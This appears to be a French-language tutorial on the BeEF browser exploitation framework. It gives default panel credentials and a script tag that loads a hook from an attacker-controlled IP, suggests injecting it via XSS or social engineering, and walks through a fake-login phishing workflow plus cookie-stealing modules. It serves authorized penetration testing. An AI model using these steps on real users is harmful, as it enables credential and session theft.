# 🐄 BeEF : Le Guide Pratique

BeEF (Browser Exploitation Framework) est un outil qui se concentre sur le navigateur web. L'idée est de "hameçonner" (to hook) un navigateur pour ensuite pouvoir lancer des actions à distance depuis le panel de contrôle de BeEF.

## 🚀 Démarrage et Accès

```bash
# Naviguer vers le dossier d'installation et lancer BeEF
cd /usr/share/beef-xss/
sudo ./beef
```

| Interface | URL | Identifiants par défaut |
|---|---|---|
| Panel de contrôle | `http://127.0.0.1:3000/ui/panel` | `beef` / `beef` |
| Hook de démo | `http://127.0.0.1:3000/demos/basic.html` | (Page pour tester le hook) |

## 🔥 Le Principe du "Hook"

Pour que BeEF fonctionne, vous devez faire en sorte qu'une victime exécute ce simple script JavaScript dans son navigateur :

```html
<script src="http://<VOTRE_IP>:3000/hook.js"></script>
```

**Comment faire ?**
- **Via une faille XSS :** C'est la méthode la plus courante. Si vous trouvez une faille XSS sur un site, vous y injectez ce script.
- **Page web compromise :** Si vous avez le contrôle d'un site web, vous pouvez ajouter le script à ses pages.
- **Ingénierie sociale :** Envoyer un lien vers une page que vous contrôlez et qui contient le script.

## 🎯 Workflow d'une Attaque de Phishing

Voici comment utiliser BeEF pour voler des identifiants avec une fausse pop-up de connexion.

1.  **Hameçonner un navigateur**
    - Lancez BeEF.
    - Faites en sorte que votre victime (ou vous-même, pour un test) visite une page contenant le `hook.js`.
    - Le navigateur de la victime apparaîtra dans le panneau de gauche de BeEF, sous "Hooked Browsers".

2.  **Choisir un module**
    - Cliquez sur le navigateur hameçonné.
    - Allez dans l'onglet `Commands`.
    - Naviguez vers `Social Engineering > Pretty Theft`.

3.  **Configurer et Lancer l'Attaque**
    - Dans les options du module "Pretty Theft", choisissez le type de pop-up que vous voulez afficher (Facebook, LinkedIn, YouTube, etc.).
    - Cliquez sur `Execute`.

4.  **Récolter les identifiants**
    - Une fausse fenêtre de connexion s'affichera dans le navigateur de la victime.
    - Si la victime entre ses identifiants, ils seront capturés et affichés dans les résultats du module, dans votre panel BeEF.

## ⚡ Autres Modules Intéressants

- **Get Cookies :** Vole les cookies de session du navigateur hameçonné.
- **Webcam :** Tente d'activer la webcam de la victime (nécessite une autorisation de l'utilisateur).
- **Get Geolocation :** Tente de récupérer la position géographique de la victime.
- **Replace HREFs :** Remplace tous les liens de la page par une URL de votre choix.

---
> ⚠️ **USAGE ÉTHIQUE UNIQUEMENT** : N'utilisez BeEF que dans le cadre d'audits autorisés. C'est un outil puissant pour démontrer l'impact d'une faille XSS.
